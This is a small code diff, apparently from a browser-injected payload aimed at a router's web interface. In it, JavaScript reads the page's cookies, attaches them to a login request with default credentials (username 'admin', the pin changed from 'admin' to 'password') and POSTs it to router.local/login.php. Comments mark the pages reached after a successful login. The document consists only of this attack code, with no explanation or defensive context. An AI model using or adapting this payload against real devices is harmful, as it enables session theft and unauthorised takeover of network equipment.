@@ -4,7 +4,7 @@
 let cook = document.cookie;
 
 let http = new XMLHttpRequest();
-let url = cook + '&username=' + 'admin' + '&pin=' + 'admin' + '&notRobot=on';
+let url = cook + '&username=' + 'admin' + '&pin=' + 'password' + '&notRobot=on';
 http.open('POST', 'http://router.local/login.php', true);
 //'http://router.local/home.php?action=view&'+cook -> what we http.responseURL if successful login
 //http://router.local/view.php
